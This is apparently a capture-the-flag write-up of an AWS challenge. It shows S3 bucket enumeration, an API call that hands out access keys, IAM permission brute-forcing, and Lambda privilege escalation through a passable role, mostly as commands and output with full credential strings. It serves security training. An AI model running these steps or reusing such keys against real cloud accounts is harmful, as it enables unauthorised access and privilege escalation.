# Level 4B

![](Pasted%20image%2020220909121518.png)

# Solution

## Identifying S3 Bucket

https://d20whnyjsgpc34.cloudfront.net

```html
<header>
  
  <div class="p-5 text-center bg-light">
    <!-- Passcode -->
    <h1 class="mb-3">Cats rule the world</h1>
    <!-- Passcode -->
    <!-- 
      ----- Completed -----
      * Configure CloudFront to use the bucket - palindromecloudynekos as the origin
      
      ----- TODO -----
      * Configure custom header referrer and enforce S3 bucket to only accept that particular header
      * Secure all object access
    -->
    <h4 class="mb-3">—ฅ/ᐠ. ̫ .ᐟ\ฅ —</h4>
  </div>
  
</header>
```


Researching on AWS S3 Buckets gives me this

https://atos.net/en/lp/securitydive/poorly-configured-s3-buckets-a-hackers-delight
Typical Bucket header

https://palindromecloudynekos.s3.amazonaws.com/index.html

## Enumerating S3 Bucket

Install AWS CLI

https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html

Configure it using your peronal account

Access
https://n0j.github.io/2017/10/02/aws-s3-ctf.html

```bash
┌──(kali㉿kali)-[/tmp/flag]
└─$ aws s3 ls s3://    

┌──(kali㉿kali)-[/tmp/flag]
└─$ aws s3 ls s3://palindromecloudynekos
                           PRE api/
                           PRE img/
2022-08-23 09:16:20         34 error.html
2022-08-23 09:16:20       2257 index.html

┌──(kali㉿kali)-[/tmp/flag]
└─$ aws s3 ls s3://palindromecloudynekos/img/
2022-07-22 06:02:45     404845 photo1.jpg
2022-07-22 06:02:45     164700 photo2.jpg
2022-07-22 06:02:46     199175 photo3.jpg
2022-07-22 06:02:45     226781 photo4.jpg
2022-07-22 06:02:46     249156 photo5.jpg
2022-07-22 06:02:45     185166 photo6.jpg

┌──(kali㉿kali)-[/tmp/flag]
└─$ aws s3 ls s3://palindromecloudynekos/api/
2022-08-23 09:16:20        432 notes.txt

┌──(kali㉿kali)-[/tmp/flag]
└─$
```

```bash
┌──(kali㉿kali)-[~]
└─$ curl https://d20whnyjsgpc34.cloudfront.net/api/notes.txt                         
# Neko Access System Invocation Notes

Invoke with the passcode in the header "x-cat-header". The passcode is found on the cloudfront site, all lower caps and separated using underscore.

https://b40yqpyjb3.execute-api.ap-southeast-1.amazonaws.com/prod/agent

All EC2 computing instances should be tagged with the key: 'agent' and the value set to your username. Otherwise, the antivirus cleaner will wipe out the resources.
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

```bash
┌──(kali㉿kali)-[/tmp/flag]
└─$ curl https://b40yqpyjb3.execute-api.ap-southeast-1.amazonaws.com/prod/agent                                       

{"Message": "Error encountered. Please raise a support ticket through your relational team lead to resolve the issue."}                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/flag]
└─$ curl https://b40yqpyjb3.execute-api.ap-southeast-1.amazonaws.com/prod/agent -H "x-cat-header: cats_rule_the_world"              

{"Message": "Welcome there agent! Use the credentials wisely! It should be live for the next 120 minutes! Our antivirus will wipe them out and the associated resources after the expected time usage.", "Access_Key": "AKIAQYDFBGMSUFX5522K", "Secret_Key": "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"}                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/flag]
└─$ 
```

```
┌──(kali㉿kali)-[/tmp/flag]
└─$ aws configure                            
AWS Access Key ID [********************]: AKIAQYDFBGMSUFX5522K
AWS Secret Access Key [********************]: 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
Default region name [None]: us-east-1
Default output format [None]: 
┌──(kali㉿kali)-[/tmp/flag]
└─$
```


## Cloud Research

execute-api -> Amazon API Gateway
https://docs.aws.amazon.com/apigateway/latest/developerguide/how-to-call-api.html 

AWS EC2 -> in notes.txt
- Run instance - Fail

IAM -> Privilege Escalation
- No Privileges to do so from enumerating


# AWS

## AWS IAM Enum

### General 
```bash
┌──(kali㉿kali)-[/tmp]
└─$ git clone https://github.com/andresriancho/enumerate-iam.git
Cloning into 'enumerate-iam'...
remote: Enumerating objects: 56, done.
remote: Total 56 (delta 0), reused 0 (delta 0), pack-reused 56
Receiving objects: 100% (56/56), 33.63 KiB | 3.74 MiB/s, done.
Resolving deltas: 100% (25/25), done.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cd enumerate-iam        
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/enumerate-iam]
└─$ 

┌──(kali㉿kali)-[/tmp/enumerate-iam]
└─$ python3 ./enumerate-iam.py --access-key AKIAQYDFBGMSUFX5522K --secret-key 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 
2022-09-08 10:29:30,843 - 13773 - [INFO] Starting permission enumeration for access-key-id "AKIAQYDFBGMSUFX5522K"
2022-09-08 10:29:32,363 - 13773 - [INFO] -- Account ARN : arn:aws:iam::051751498533:user/user-b464a9d644194b0dafc3d166d36d5c4e
2022-09-08 10:29:32,364 - 13773 - [INFO] -- Account Id  : 051751498533
2022-09-08 10:29:32,364 - 13773 - [INFO] -- Account Path: user/user-b464a9d644194b0dafc3d166d36d5c4e
2022-09-08 10:29:32,615 - 13773 - [INFO] Attempting common-service describe / list brute force.
2022-09-08 10:29:35,551 - 13773 - [INFO] -- ec2.describe_regions() worked!
2022-09-08 10:29:36,374 - 13773 - [INFO] -- ec2.describe_vpcs() worked!
2022-09-08 10:29:36,790 - 13773 - [INFO] -- ec2.describe_subnets() worked!
2022-09-08 10:29:36,925 - 13773 - [INFO] -- ec2.describe_route_tables() worked!
/home/kali/.local/lib/python3.9/site-packages/botocore/client.py:621: FutureWarning: The rds client is currently using a deprecated endpoint: rds.amazonaws.com. In the next minor version this will be moved to rds.us-east-1.amazonaws.com. See https://github.com/boto/botocore/issues/2705 for more details.
  warnings.warn(
2022-09-08 10:29:37,139 - 13773 - [INFO] -- ec2.describe_security_groups() worked!
/home/kali/.local/lib/python3.9/site-packages/botocore/client.py:621: FutureWarning: The sqs client is currently using a deprecated endpoint: queue.amazonaws.com. In the next minor version this will be moved to sqs.us-east-1.amazonaws.com. See https://github.com/boto/botocore/issues/2705 for more details.
  warnings.warn(
/home/kali/.local/lib/python3.9/site-packages/botocore/client.py:621: FutureWarning: The shield client is currently using a deprecated endpoint: shield.us-east-1.amazonaws.com. In the next minor version this will be moved to shield.us-east-1.amazonaws.com. See https://github.com/boto/botocore/issues/2705 for more details.
  warnings.warn(
2022-09-08 10:29:45,719 - 13773 - [INFO] -- dynamodb.describe_endpoints() worked!
/home/kali/.local/lib/python3.9/site-packages/botocore/client.py:621: FutureWarning: The health client is currently using a deprecated endpoint: health.us-east-1.amazonaws.com. In the next minor version this will be moved to global.health.amazonaws.com. See https://github.com/boto/botocore/issues/2705 for more details.
  warnings.warn(
2022-09-08 10:29:49,024 - 13773 - [INFO] -- sts.get_session_token() worked!
2022-09-08 10:29:49,284 - 13773 - [INFO] -- sts.get_caller_identity() worked!
2022-09-08 10:29:51,080 - 13773 - [INFO] -- iam.list_roles() worked!
2022-09-08 10:29:52,409 - 13773 - [INFO] -- iam.list_instance_profiles() worked!
2022-09-08 10:29:55,985 - 13773 - [ERROR] Remove globalaccelerator.describe_accelerator_attributes action
```

https://aws.amazon.com/premiumsupport/knowledge-center/iam-assume-role-cli/

Researched here
https://pentestbook.six2dez.com/enumeration/cloud/aws

#### STS
I want to find out the user first

```bash
┌──(kali㉿kali)-[/tmp]
└─$ aws sts get-session-token
{
    "Credentials": {
        "AccessKeyId": "ASIAQYDFBGMSZBF6TPOA",
        "SecretAccessKey": "Sb9XcmVH6D9AHBkyZqrEcmVDHj1Oc8bc+uTx3Sfc",
        "SessionToken": "IQoJb3JpZ2luX2VjEKL//////////wEaCXVzLWVhc3QtMSJHMEUCICzSTyubo2spTfu218pmipD3AYOuvnC5LlyAbhn0puoRAiEA8cdOAMs8VwGz2AuVcyvjq1l6dpB9QXrVl3KfF3cv1AIq6wEIOxABGgwwNTE3NTE0OTg1MzMiDLaA+gudPdOkAEldWCrIAa0Dqo6VDEv9Pdz6fft34HbHzK1bpbyCjN4I5BPoQDGDB9NL9ndxhITaq6fOB6dIXGDKYPhUbrTFvVfIDENksgK5MET6qgb3wNw9wEmGFzmdSBXDj5YLBUVZwx7VmdM/3y42Jcii9CuAY/Zl7aT6DSO3GOTpkbNEAYwsgQEtNR3mqiGS1+qlfa29dK+zieN40jvT4zoLi8mkYpCXfb17mY4P2NT/0GK4Dd2uin7zOcf/LCvoG3eN7jOfcETxf5OzfvC3WTsRx7FBMMyw6pgGOpgBPxv6X3QG+ux6pWx+xnmZvz06ju8lq4h9EOmDWd3gi3bUwSI8DkbAmEUGZ0VPXcBzZ2s+mgntkHwYFhLZAJd5s04sJnnEZDbaGWTM3SzS+1yuODmEHg9c31yHUmpEE/rI7TpaQRg1v4oaLvdhM03OCmDQY4uuT96Gi4xRLy7vLpklg3fXAWPt746hvsZ8HP61KlBLyEZJams=",
        "Expiration": "2022-09-09T13:35:08+00:00"
    }
}
```

The username can be found in the Arn. Its after the slash, in this case its `user-a4f54ea053294863a598e6d01c5e4cc3`

```bash
┌──(kali㉿kali)-[/tmp]
└─$ aws sts get-caller-identity
{
    "UserId": "AIDAQYDFBGMS6M3T3E7N7",
    "Account": "051751498533",
    "Arn": "arn:aws:iam::051751498533:user/user-a4f54ea053294863a598e6d01c5e4cc3"
}
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```


### IAM

I wanted to look at the list of roles first, to figure what I can do.

```bash
┌──(kali㉿kali)-[/tmp/flag]
└─$ aws iam list-roles    
	...

        {
            "Path": "/",
            "RoleName": "ec2_agent_role",
            "RoleId": "AROAQYDFBGMSYSEMEVAEH",
            "Arn": "arn:aws:iam::051751498533:role/ec2_agent_role",
            "CreateDate": "2022-07-22T09:29:34+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "ec2.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/",
            "RoleName": "lambda_agent_development_role",
            "RoleId": "AROAQYDFBGMS2NDQR5JSE",
            "Arn": "arn:aws:iam::051751498533:role/lambda_agent_development_role",
            "CreateDate": "2022-07-22T09:29:34+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "lambda.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/",
            "RoleName": "lambda_agent_webservice_role",
            "RoleId": "AROAQYDFBGMSTH7VQVGQC",
            "Arn": "arn:aws:iam::051751498533:role/lambda_agent_webservice_role",
            "CreateDate": "2022-07-22T09:29:35+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "lambda.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "MaxSessionDuration": 3600
        },
    ...
```


### User Policy

I tried to find user policy to figure out what I can and cannot do

```bash
┌──(weirdAAL)(kali㉿kali)-[/tmp/AWS]
└─$ aws iam list-attached-user-policies --user-name user-a5df75ad1753434aa2db7dbe7d361b96                                                                         254 ⨯
{
    "AttachedPolicies": [
        {
            "PolicyName": "user-a5df75ad1753434aa2db7dbe7d361b96",
            "PolicyArn": "arn:aws:iam::051751498533:policy/user-a5df75ad1753434aa2db7dbe7d361b96"
        }
    ]
}
                                                                                                                                                                        
┌──(weirdAAL)(kali㉿kali)-[/tmp/AWS]
└─$ aws iam get-policy --policy-arn "arn:aws:iam::051751498533:policy/user-a5df75ad1753434aa2db7dbe7d361b96"
{
    "Policy": {
        "PolicyName": "user-a5df75ad1753434aa2db7dbe7d361b96",
        "PolicyId": "ANPAQYDFBGMSUGVZ37LUE",
        "Arn": "arn:aws:iam::051751498533:policy/user-a5df75ad1753434aa2db7dbe7d361b96",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "CreateDate": "2022-09-09T07:35:46+00:00",
        "UpdateDate": "2022-09-09T07:35:46+00:00",
        "Tags": []
    }
}
┌──(weirdAAL)(kali㉿kali)-[/tmp/AWS]
└─$ aws iam get-policy-version --policy-arn "arn:aws:iam::051751498533:policy/user-a5df75ad1753434aa2db7dbe7d361b96" --version-id "v1"                            252 ⨯
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetPolicy",
                        "iam:GetPolicyVersion",
                        "iam:ListAttachedRolePolicies",
                        "iam:ListRoles"
                    ],
                    "Resource": "*"
                },
                {
                    "Sid": "VisualEditor1",
                    "Effect": "Allow",
                    "Action": [
                        "lambda:CreateFunction",
                        "lambda:InvokeFunction",
                        "lambda:GetFunction"
                    ],
                    "Resource": "arn:aws:lambda:ap-southeast-1:051751498533:function:${aws:username}-*"
                },
                {
                    "Sid": "VisualEditor2",
                    "Effect": "Allow",
                    "Action": [
                        "iam:ListAttachedUserPolicies"
                        "iam:ListAttachedUserPolicies"
                    ],
                    "Resource": "arn:aws:iam::051751498533:user/${aws:username}"
                },
                {
                    "Sid": "VisualEditor3",
                    "Effect": "Allow",
                    "Action": [
                        "iam:PassRole"
                    ],
                    "Resource": "arn:aws:iam::051751498533:role/lambda_agent_development_role"
                },
                {
                    "Sid": "VisualEditor4",
                    "Effect": "Allow",
                    "Action": [
                        "ec2:DescribeVpcs",
                        "ec2:DescribeRegions",
                        "ec2:DescribeSubnets",
                        "ec2:DescribeRouteTables",
                        "ec2:DescribeSecurityGroups",
                        "ec2:DescribeInstanceTypes",
                        "iam:ListInstanceProfiles"
                    ],
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2022-09-09T07:35:46+00:00"
    }
}
                                                                                                                                                                        
┌──(weirdAAL)(kali㉿kali)-[/tmp/AWS]
└─$
```

`arn:aws:iam::051751498533:role/lambda_agent_development_role` as `iam:PassRole`, while
you can create lambda functions with the name `arn:aws:lambda:ap-southeast-1:051751498533:function:${aws:username}-*`

## AWS Lambda 

### Function Testing

https://medium.com/@corymaklin/tutorial-amazon-web-services-part-3-lambda-functions-with-aws-cli-ba9f53c5f5ec

```bash
┌──(weirdAAL)(kali㉿kali)-[/tmp/AWS]
└─$ nano index.js

┌──(weirdAAL)(kali㉿kali)-[/tmp/AWS]
└─$ cat index.js           

exports.handler = async function(event, context, callback) {
  return 'hello world';
}

┌──(weirdAAL)(kali㉿kali)-[/tmp/AWS]
└─$ zip function.zip index.js
  adding: index.js (deflated 7%)
  
┌──(weirdAAL)(kali㉿kali)-[/tmp/AWS]
└─$ aws lambda create-function --function-name user-a5df75ad1753434aa2db7dbe7d361b96-helloworld --zip-file fileb://function.zip --runtime nodejs16.x --handler index.handler --role arn:aws:iam::051751498533:role/lambda_agent_development_role
{
    "FunctionName": "user-a5df75ad1753434aa2db7dbe7d361b96-helloworld",
    "FunctionArn": "arn:aws:lambda:ap-southeast-1:051751498533:function:user-a5df75ad1753434aa2db7dbe7d361b96-helloworld",
    "Runtime": "nodejs16.x",
    "Role": "arn:aws:iam::051751498533:role/lambda_agent_development_role",
    "Handler": "index.handler",
    "CodeSize": 248,
    "Description": "",
    "Timeout": 3,
    "MemorySize": 128,
    "LastModified": "2022-09-09T08:04:50.310+0000",
    "CodeSha256": "GC2ej8g5kiPRFpnf9EQvIcl4DkDriObC0LPg6kJxTLM=",
    "Version": "$LATEST",
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "918de20b-0d4d-4ef6-8674-704980ae7c8b",
    "State": "Pending",
    "StateReason": "The function is being created.",
    "StateReasonCode": "Creating",
    "PackageType": "Zip",
    "Architectures": [
        "x86_64"
    ],
    "EphemeralStorage": {
        "Size": 512
    }
}
                                                                                                                                                                        
┌──(weirdAAL)(kali㉿kali)-[/tmp/AWS]
└─$ aws lambda get-function --function-name user-a5df75ad1753434aa2db7dbe7d361b96-helloworld 
{
    "Configuration": {
        "FunctionName": "user-a5df75ad1753434aa2db7dbe7d361b96-helloworld",
        "FunctionArn": "arn:aws:lambda:ap-southeast-1:051751498533:function:user-a5df75ad1753434aa2db7dbe7d361b96-helloworld",
        "Runtime": "nodejs16.x",
        "Role": "arn:aws:iam::051751498533:role/lambda_agent_development_role",
        "Handler": "index.handler",
        "CodeSize": 248,
        "Description": "",
        "Timeout": 3,
        "MemorySize": 128,
        "LastModified": "2022-09-09T08:04:50.310+0000",
        "CodeSha256": "GC2ej8g5kiPRFpnf9EQvIcl4DkDriObC0LPg6kJxTLM=",
        "Version": "$LATEST",
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "97b94a13-cc62-4ce9-bef1-307ced395057",
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip",
        "Architectures": [
            "x86_64"
        ],
        "EphemeralStorage": {
            "Size": 512
        }
    },
    "Code": {
        "RepositoryType": "S3",
        "Location": "https://awslambda-ap-se-1-tasks.s3.ap-southeast-1.amazonaws.com/snapshots/051751498533/user-a5df75ad1753434aa2db7dbe7d361b96-helloworld-adf2d0ad-5438-45a2-bde3-3a9342de84e2?versionId=j8OIPEw3mHT2701GwQ5R7di10kb.KGZh&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDmFwLXNvdXRoZWFzdC0xIkgwRgIhAML%2Fuslw0lHqTwVUclp0IjRq4j97DKbSw8fqdcAWhZdVAiEApRqDANMihAVPnaTPCFfYkQLVzWqUcbTGX3fYbSm7G3Aq2wQIQBAEGgwyOTUzMzg3MDM1ODMiDCIdr4DbWo5ooe%2F48Sq4BNKHgqSncjFRgBPZoyZG3qvqJiFBDYCGkQxYwzfoWJw6fKJ38fbeRI9hEAXz45nPG5YdPYwPlbTxV0KGA9wJxONeA7e3%2BDrhdZalJlMYdWc3f0okBYN%2FzfGR7Dr%2F40gtl4TqsjEMsYn5K83554LhIaAvpF3RsEM5PGmlF6FNDKxpArX41kGqzBFyO%2Fc6XnT4HmwFZd178cCDe3b9TtzwiJ9uKptgvPJ0rLAJwFWn%2BSYDj7N%2Bk6nLPw07Ca7%2BjljKyzJQY39VYRYRtbOemDQnoe9q9tAfhcAeWUsLMQpmQrYtMU%2FA8qtsXNpwfXyJYRQOQ8hbo258b7PBrhMKmr12KQp4UbKXD%2B9Ch8ONBTfkaBc4%2BQzE6Q6lqqhUwWg3TklBFDpkr4phU%2FY69PBn60ZCUmDjJiAqGjiretanxVzcEeP56YaT3wtaEYHY2DqfmR35I4SAfaQHqpu0oDR2FtyvsJiJNVh2f2PGLdJELlKAyP%2BWRRFpiDtTxQyA%2FPf6J03p71ZhkOQdZnOhSCiUx8qhiuhwIbK5zIqwgcMHhnF0WFr7tQLHRbgLqG2If2XQQgMQ5jOYY%2BmeVUNR3rhKeWtTRJk%2Bf0iJruf4S%2Fd5biQrFQ7HQzWEkSAbeJHZhHqrLo7K2gYnZ%2Fb%2FjweGkb%2F0mIzR8co72At6cJLZskOHorltPWhEyEa5J7NfkcZokuRPDcX14xAdGH04yfjBNJ1w60rIvzo8Wf5nzVBNSNZC3dAzWYkJGQOvFT9pQ%2FwwvMzrmAY6qAHq%2FszymAahlDysJ89xW19gKNJem84Bp7lEVUjPngmTEWDw7Y%2Ft5iVkEikEtfHnAn1WSHfoVgpl3GbAyh%2FawyzVfKirLfXuLw%2FWAsSsIiKd2O5YEgc3tX21miUktThFjIFEiomiUMbwMtmMSngJPBBKvFCmuScSC6vqplwYE1ykWQvGxKetwmsj%2BnztQKIas2aHBhZyHTdWbajX7y2EWMWiHMB6czPE1xI%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20220909T080615Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Credential=ASIAUJQ4O7LPUL5JLYKT%2F20220909%2Fap-southeast-1%2Fs3%2Faws4_request&X-Amz-Signature=cc5fdd01b0c9b58854a454b446f84fe461a96d1ef1f683702296888a3f0d82c6"
    }
}
┌──(weirdAAL)(kali㉿kali)-[/tmp/AWS]
└─$ aws lambda invoke --function-name user-a5df75ad1753434aa2db7dbe7d361b96-helloworld out.txt                                                                    252 ⨯
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
                                                                                                                                                                        
┌──(weirdAAL)(kali㉿kali)-[/tmp/AWS]
└─$ cat out.txt 
"hello world"    

┌──(weirdAAL)(kali㉿kali)-[/tmp/AWS]
└─$ 
```

### Lambda Python Code Testing

```bash
┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
└─$ cat run.sh             
pip install --target ./package requests
cd package
zip -r ../function.zip .
cd ..
zip -g function.zip lambda_function.py

┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
└─$ 

┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
└─$ cat index.py    
import requests
def lambda_handler(event, context):   
    response = requests.get("https://www.example.com/")
    print(response.text)
    return response.text

┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
└─$ ./run.sh  

...

┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
└─$ aws lambda create-function --zip-file fileb://function.zip --runtime python3.7 --handler lambda_function.lambda_handler --role arn:aws:iam::051751498533:role/lambda_agent_development_role --function-name user-a5df75ad1753434aa2db7dbe7d361b96-ppp
{
    "FunctionName": "user-a5df75ad1753434aa2db7dbe7d361b96-ppp",
    "FunctionArn": "arn:aws:lambda:ap-southeast-1:051751498533:function:user-a5df75ad1753434aa2db7dbe7d361b96-ppp",
    "Runtime": "python3.7",
    "Role": "arn:aws:iam::051751498533:role/lambda_agent_development_role",
    "Handler": "lambda_function.lambda_handler",
    "CodeSize": 1044985,
    "Description": "",
    "Timeout": 3,
    "MemorySize": 128,
    "LastModified": "2022-09-09T09:11:21.568+0000",
    "CodeSha256": "rrHsbvIX4xmkOxbJk6PHC+j6jBdnH5loEyyrnCYdcPI=",
    "Version": "$LATEST",
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "300029c8-6dba-4a6d-99ac-9664a7d253aa",
    "State": "Pending",
    "StateReason": "The function is being created.",
    "StateReasonCode": "Creating",
    "PackageType": "Zip",
    "Architectures": [
        "x86_64"
    ],
    "EphemeralStorage": {
        "Size": 512
    }
}
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
└─$ aws lambda invoke --function-name user-a5df75ad1753434aa2db7dbe7d361b96-ppp /tmp/out.txt
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
└─$ cat /tmp/out.txt 
"<!doctype html>\n<html>\n<head>\n    <title>Example Domain</title>\n\n    <meta charset=\"utf-8\" />\n    <meta http-equiv=\"Content-type\" content=\"text/html; charset=utf-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <style type=\"text/css\">\n    body {\n        background-color: #f0f0f2;\n        margin: 0;\n        padding: 0;\n        font-family: -apple-system, system-ui, BlinkMacSystemFont, \"Segoe UI\", \"Open Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif;\n        \n    }\n    div {\n        width: 600px;\n        margin: 5em auto;\n        padding: 2em;\n        background-color: #fdfdff;\n        border-radius: 0.5em;\n        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);\n    }\n    a:link, a:visited {\n        color: #38488f;\n        text-decoration: none;\n    }\n    @media (max-width: 700px) {\n        div {\n            margin: 0 auto;\n            width: auto;\n        }\n    }\n    </style>    \n</head>\n\n<body>\n<div>\n    <h1>Example Domain</h1>\n    <p>This domain is for use in illustrative examples in documents. You may use this\n    domain in literature without prior coordination or asking for permission.</p>\n    <p><a href=\"https://www.iana.org/domains/example\">More information...</a></p>\n</div>\n</body>\n</html>\n"                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
└─$ 
```

### Lambda Role Policy

```bash
┌──(weirdAAL)(kali㉿kali)-[/tmp/AWS/lambda]
└─$ aws iam list-attached-role-policies --role-name "lambda_agent_development_role"                                                                               254 ⨯
{
    "AttachedPolicies": [
        {
            "PolicyName": "iam_policy_for_lambda_agent_development_role",
            "PolicyArn": "arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role"
        }
    ]
}
                                                                                                                                                                        
┌──(weirdAAL)(kali㉿kali)-[/tmp/AWS/lambda]
└─$ aws iam get-policy --policy-arn "arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role"
{
    "Policy": {
        "PolicyName": "iam_policy_for_lambda_agent_development_role",
        "PolicyId": "ANPAQYDFBGMS2XASGX3JS",
        "Arn": "arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role",
        "Path": "/",
        "DefaultVersionId": "v2",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "AWS IAM Policy for Lambda agent development service",
        "CreateDate": "2022-07-22T09:29:36+00:00",
        "UpdateDate": "2022-08-23T13:16:26+00:00",
        "Tags": []
    }
}
                                                                                                                                                                        
┌──(weirdAAL)(kali㉿kali)-[/tmp/AWS/lambda]
└─$ aws iam get-policy-version --policy-arn "arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role" --version-id "v2"
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "ec2:RunInstances",
                        "ec2:CreateVolume",
                        "ec2:CreateTags"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                },
                {
                    "Action": [
                        "lambda:GetFunction"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:lambda:ap-southeast-1:051751498533:function:cat-service"
                },
                {
                    "Action": [
                        "iam:PassRole"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:iam::051751498533:role/ec2_agent_role",
                    "Sid": "VisualEditor2"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2022-08-23T13:16:26+00:00"
    }
}
                                                                                                                                                                        

┌──(weirdAAL)(kali㉿kali)-[/tmp/AWS/lambda]
└─$ 
```

```bash
┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
└─$ aws lambda invoke --function-name arn:aws:lambda:ap-southeast-1:051751498533:function:cat-service /tmp/out.txt

An error occurred (AccessDeniedException) when calling the Invoke operation: User: arn:aws:iam::051751498533:user/user-00e6fd16c555452c900d1b14d6af61c5 is not authorized to perform: lambda:InvokeFunction on resource: arn:aws:lambda:ap-southeast-1:051751498533:function:cat-service because no identity-based policy allows the lambda:InvokeFunction action
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
└─$
```

### Lambda Privesc, view other Lambda

https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/lambda_privesc/README.md

lambda_function.py

```python
# https://www.learnaws.org/2020/12/16/aws-ec2-boto3-ultimate-guide/
# https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/lambda_privesc/cheat_sheet_chris.md
import boto3

REGION_NAME="ap-southeast-1"

# https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/lambda.html#Lambda.Client.get_function
def get_function():
    lambda_client = boto3.client('lambda')
    response = lambda_client.get_function(
        FunctionName='arn:aws:lambda:ap-southeast-1:051751498533:function:cat-service'
    )
    return response

def lambda_handler(event, context):
    func_response = get_function()
    return func_response
	
#role_arn="arn:aws:iam::051751498533:role/ec2_agent_role"
```

run.sh
```bash
LAMBDA_FUNC=user-00e6fd16c555452c900d1b14d6af61c5-ec2test4

pip install --target ./package boto3
cd package
zip -r ../function.zip . > /dev/null
cd ..
zip -g function.zip lambda_function.py
rm -rf package

aws lambda create-function --zip-file fileb://function.zip --runtime python3.7 --handler lambda_function.lambda_handler --role arn:aws:iam::051751498533:role/lambda_agent_development_role --function-name $LAMBDA_FUNC
aws lambda invoke --function-name $LAMBDA_FUNC /tmp/out.txt
cat /tmp/out.txt
```

```bash
┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
└─$ ls
lambda_function.py  run.sh
                                                                                            ┌──(kali㉿kali)-[/tmp/AWS/lambda/hack-function]
└─$ ./run.sh
...
updating: lambda_function.py (deflated 43%)
{
    "FunctionName": "user-00e6fd16c555452c900d1b14d6af61c5-ec2test4",
    "FunctionArn": "arn:aws:lambda:ap-southeast-1:051751498533:function:user-00e6fd16c555452c900d1b14d6af61c5-ec2test4",
    "Runtime": "python3.7",
    "Role": "arn:aws:iam::051751498533:role/lambda_agent_development_role",
    "Handler": "lambda_function.lambda_handler",
    "CodeSize": 9332181,
    "Description": "",
    "Timeout": 3,
    "MemorySize": 128,
    "LastModified": "2022-09-09T10:00:13.477+0000",
    "CodeSha256": "WZtZZh86oUgfKI5/0zRc+JVC1++pkWsl22clPyWDaUo=",
    "Version": "$LATEST",
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "bb298cd0-0211-460a-a5ad-15c90b2173c1",
    "State": "Pending",
    "StateReason": "The function is being created.",
    "StateReasonCode": "Creating",
    "PackageType": "Zip",
    "Architectures": [
        "x86_64"
    ],
    "EphemeralStorage": {
        "Size": 512
    }
}
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
